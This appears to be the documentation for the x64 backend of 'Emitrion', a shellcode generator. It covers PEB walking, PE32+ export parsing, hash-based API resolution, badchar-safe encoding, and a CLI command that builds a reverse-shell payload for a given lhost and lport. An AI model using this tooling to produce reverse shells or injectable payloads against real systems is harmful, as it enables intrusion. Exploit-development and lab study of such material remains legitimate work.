# Windows x64 Backend

## Overview

The x64 backend extends the Emitrion shellcode emitter with position-independent
Windows x64 shellcode generation. It reuses the existing intermediate representation
(IR), workflow definitions, API catalog, and validator, adding architecture-specific
components for the Microsoft x64 calling convention, 64-bit encoding, RSP-relative
stack addressing, GS-based PEB access, and PE32+ export parsing.

## Architecture

```
manifest.yaml (arch: x64)
  -> schema.py (load, validate x64 registers)
  -> stack_alloc_x64.py (RSP-relative zones)
  -> build_x64.py:compose_asm_x64() orchestrates:
       1. Framework stubs (GS PEB walk, PE32+ export resolution)
       2. API resolution stubs per function (hash-based)
       3. Module loading (LoadLibraryA calls)
       4. String construction (dword-chunked, badchar-safe)
       5. Structure initialization (rep stosq or inline)
       6. Payload assembly (workflow IR lowered to x64)
  -> build_x64.py:build_x64() (Keystone x64 assembly, contract doc, debug runner)
```

## Microsoft x64 Calling Convention

| Aspect | Detail |
|--------|--------|
| Integer args 0-3 | RCX, RDX, R8, R9 |
| Integer args 4+ | Stack at [RSP+0x20], [RSP+0x28], ... |
| Shadow space | 32 bytes always reserved at [RSP+0x00..0x1F] |
| Return value | RAX |
| Stack alignment | 16-byte aligned at CALL instruction |
| Volatile regs | RAX, RCX, RDX, R8, R9, R10, R11 |
| Non-volatile | RBX, RBP, RDI, RSI, R12-R15 |

## Stack Frame Layout (RSP-relative)

```
[RSP + 0x000..0x01F]  Shadow space (32 bytes, always reserved)
[RSP + 0x020..0x03F]  Shadow space extension (for stack args beyond 4)
[RSP + 0x040..]       Module base pointers (8 bytes each)
                       API function pointers (8 bytes each)
                       Variables (8 bytes each)
[RSP + 0x100..]       Structures (8-byte aligned)
                       Strings (8-byte aligned)
```

Frame size is 16-byte aligned, maximum 0x2000 (2 pages).

## x64 PEB Walk

Access via `GS:[0x60]` (x64) instead of `FS:[0x30]` (x86):

```
GS:[0x60]           -> PEB
PEB + 0x18          -> PEB_LDR_DATA
PEB_LDR_DATA + 0x30 -> InInitializationOrderModuleList.Flink
```

Module enumeration checks UTF-16LE module names for KERNEL32.DLL (first char K=0x004B,
second char E=0x0045, seventh char 3=0x0033).

## PE32+ Export Parsing

```
ImageBase + 0x3C     -> e_lfanew (PE signature offset)
PE + 0x88            -> Export Directory RVA (DataDirectory[0], PE32+ offset)
Export Dir + 0x18    -> NumberOfNames
Export Dir + 0x1C    -> AddressOfFunctions RVA
Export Dir + 0x20    -> AddressOfNames RVA
Export Dir + 0x24    -> AddressOfNameOrdinals RVA
```

## x64 Struct Differences

| Struct | x86 Size | x64 Size | Key Differences |
|--------|----------|----------|-----------------|
| STARTUPINFOA | 0x44 | 0x68 | cb at 0x00 (4B), dwFlags at 0x3c (4B), handles at 0x50/0x58/0x60 (8B each) |
| PROCESS_INFORMATION | 0x10 | 0x18 | hProcess at 0x00 (8B), hThread at 0x08 (8B), PIDs at 0x10/0x14 (4B) |
| sockaddr_in | 0x10 | 0x10 | Same layout |
| WSADATA | 0x190 | 0x190 | Same size, 8-byte alignment |

## Badchar-Safe Encoding

The `encode_x64` module provides:

- `encode_qword`: 64-bit immediate loading with XOR mask fallback
- `encode_dword_into_r64`: 32-bit value via zero-extending mov r32, imm32
- `safe_qword_store`, `safe_dword_store_x64`, `safe_word_store_x64`: Memory stores
- `safe_mem_load_x64`, `safe_lea_x64`, `safe_call_mem_x64`: Loads, LEA, indirect call
- Uses r11 as primary scratch register (volatile, not an argument register)

When a displacement or immediate contains badchars, the encoder splits the value
into an XOR-masked pair where neither half contains forbidden bytes.

## Build Pipeline

### From CLI

```bash
uv run emitrion emitrion/manifests/x64/revshell_x64.yaml --lhost 10.0.0.1 --lport 9001 --no-assemble --out emitter_out/
```

The main `build()` function auto-detects `arch: x64` in the manifest and routes
to `build_x64()`.

### From Python

```python
from emitrion.build_x64 import build_x64
result = build_x64("path/to/manifest_x64.yaml", assemble=False)
print(result.asm)
```

### Outputs

- `asm/generated.asm`: Full x64 assembly source (BITS 64)
- `asm/debug_runner.py`: Self-contained Python script for Windows lab VM
  (uses Keystone KS_MODE_64, 64-bit VirtualAlloc/CreateThread)
- `Documentation/contract.md`: x64 stack layout, API table with hashes

## Manifest Format

```yaml
arch: x64
template: ir_run_command
badchars: ["00", "0A", "0D"]

functions:
  - WinExec

strings:
  - label: cmd
    value: calc.exe
    method: mov
    dest: rdi            # x64 register (default for x64)
```

The `arch: x64` field selects x64 register validation (`rax..r15` instead of
`eax..edi`) and routes through the x64 build pipeline.

## Testing

```bash
# x64 encoding tests
uv run pytest emitrion/tests/test_x64_encode.py -q

# x64 stack allocator tests
uv run pytest emitrion/tests/test_x64_stack_alloc.py -q

# x64 workflow/backend tests
uv run pytest emitrion/tests/test_workflow_x64.py -q

# x64 build pipeline tests
uv run pytest emitrion/tests/test_x64_build.py -q

# All tests (x86 + x64)
uv run pytest emitrion/tests/ -q
```

## Module Map

| Module | Purpose |
|--------|---------|
| `arch.py` | Architecture enum (X86/X64) with ptr_size, bits |
| `encode_x64.py` | Badchar-safe x64 immediate and memory encoding |
| `stack_alloc_x64.py` | RSP-relative stack allocator with 6 zones |
| `workflow/x64_backend.py` | IR lowering to Microsoft x64 calling convention |
| `build_x64.py` | x64 compose pipeline, framework stubs, build entry point |
| `api_database.py` | STRUCT_DATABASE_X64 (x64-specific struct layouts) |
| `schema.py` | arch field, x64 register validation |
| `payload_templates/base.py` | arch-aware probe_slots dispatch |
| `workflow/reference.py` | layout-type dispatch for x64 IR lowering |

## Shared Infrastructure (reused from x86)

- `workflow/ir.py`: Intermediate representation (architecture-neutral)
- `workflow/validator.py`: IR validation
- `workflow/catalog.py`: ABI catalog
- `workflow/reference.py`: Workflow builders (run_command, reverse_shell, etc.)
- `hash_gen.py`: ROR-13 hash computation
- `api_database.py`: API_DATABASE, MODULE_LOAD_ORDER
- `strings.py`: String-to-push-sequence generator
